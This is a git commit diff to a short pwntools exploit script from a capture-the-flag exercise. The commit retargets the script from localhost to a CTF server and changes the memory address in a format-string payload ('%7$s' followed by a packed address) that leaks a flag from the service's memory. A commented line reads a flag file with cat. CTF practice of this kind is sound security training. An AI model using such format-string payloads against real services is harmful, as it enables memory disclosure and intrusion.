0ec3b85c376c636d949fb466f8065db79e9b0abb
k123321141 <kk123321141@gamil.com>
2017-10-13 13:44:58 +0800

    cr4ck done

--- 10:13/script_cr4ck.py
+++ 10:13/script_cr4ck.py
@@ -2,13 +2,13 @@ from pwn import *
 
 context.arch = 'amd64'
 
-r = remote('127.0.0.1',8888)
-#r = remote('csie.ctf.tw',10131)
+#r = remote('127.0.0.1',8888)
+r = remote('csie.ctf.tw',10133)
 
 r.recvuntil('?')
 
 
-flag_addr = 0x4007b4
+flag_addr = 0x600ba0
 format_str = '%7$s.aaa' + p64(flag_addr)
 r.send(format_str)
 #r.sendline'cat ./home/ret2plt/flag')
